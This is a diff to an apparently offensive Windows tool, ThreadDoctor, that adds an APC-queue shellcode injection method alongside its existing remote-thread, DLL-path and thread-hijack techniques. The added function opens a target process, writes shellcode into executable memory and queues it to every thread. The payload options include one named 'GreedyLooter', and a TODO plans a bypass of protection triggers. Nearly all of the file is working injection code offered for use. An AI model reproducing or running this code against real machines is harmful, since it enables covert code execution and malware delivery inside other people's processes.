@@ -11,10 +11,11 @@
 //TODO:
 // - Implement Error Checking
 // - add x86 payloads
+// - Implement PAGE_EXECUTE_READWRITE trigger bypass with VirtualProctectEx
 // - Various APC
 // - memory map
 
-enum class InjType { None, RemoteThread, DLLPath, ThreadHijack};
+enum class InjType { None, RemoteThread, DLLPath, ThreadHijack, QueueAPC};
 enum class Payload { None, Calculator, Commandline, GreedyLooter};
 
 // get Process ID by process name
@@ -89,6 +90,7 @@ BOOL createRemoteThreadInject(DWORD processId, HGLOBAL shellcode, const size_t s
 	return true;
 }
 
+// returns main thread of process
 HANDLE getThread(DWORD pid) {
 	THREADENTRY32 threadEntry;
 	// needed for Thread32First function to iterate
@@ -140,6 +142,32 @@ BOOL threadHijackInject(DWORD processId, HGLOBAL shellcode, const size_t shellco
 	return true;
 }
 
+// Queue an APC call to shellcode for each thread in process
+// Thread in which the APC was queued needs to be or enter into an alertable state to run (SleepEx, SignalObjectAndWait, MsgWaitForMultipleObjectsEx, WaitForMultipleObjectsEx, or WaitForSingleObjectEx)
+BOOL queueAPCInject(DWORD processId, HGLOBAL shellcode, const size_t shellcodeSize) {
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+
+	// Allocate Buffer for shellcode in remote process
+	LPVOID rBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	// cast shellcode address to PThread routine
+	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)rBuffer;
+	// Write shellcode to remote buffer
+	BOOL cWrite = WriteProcessMemory(hProcess, rBuffer, (LPCVOID)shellcode, shellcodeSize, NULL);
+
+	THREADENTRY32 threadEntry;
+	// needed for Thread32First function to iterate
+	threadEntry.dwSize = sizeof(THREADENTRY32);
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+	// for every thread in snapshot that belongs to process, queue APC
+	for (Thread32First(snapshot, &threadEntry); Thread32Next(snapshot, &threadEntry);) {
+		if (threadEntry.th32OwnerProcessID == processId) {
+			 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
+			 QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);
+		}
+	}
+
+	return true;
+}
 // Shellcode resources used in shellcodeInject
 // Import payload resource:
 // https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
@@ -174,7 +202,7 @@ std::tuple<HGLOBAL,DWORD> getPayload(Payload payload) {
 // prints commandline usage
 int printUsage() {
 	wprintf(L"Usage: ThreadDoctor.exe <-t Injection-Type> <-p Payload> [-f DLLPath] {-n ProcessName|-d ProcessID}\n");
-	wprintf(L"  -t <type>          Injection type (1: RemoteThread, 2: DLLPath, 3: ThreadHijack)\n");
+	wprintf(L"  -t <type>          Injection type (1: RemoteThread, 2: DLLPath, 3: ThreadHijack, 4: QueueAPC)\n");
 	wprintf(L"  -p <payload>       x64 payload to use (1: Calculator, 2: Commandline, 2: GreedyLooter)\n");
 	wprintf(L"  -n <PID>           PID of target process\n");
 	wprintf(L"  -d <proc-name>     target process name\n");
@@ -262,6 +290,12 @@ int wmain(int argc, wchar_t *argv[])
 	{
 		std::tuple<HGLOBAL,DWORD> shellcode = getPayload(payload);
 		threadHijackInject(processId, std::get<0>(shellcode), std::get<1>(shellcode));
+		break;
+	}
+	case InjType::QueueAPC:
+	{
+		std::tuple<HGLOBAL,DWORD> shellcode = getPayload(payload);
+		queueAPCInject(processId, std::get<0>(shellcode), std::get<1>(shellcode));
 		break;
 	}
 	default:
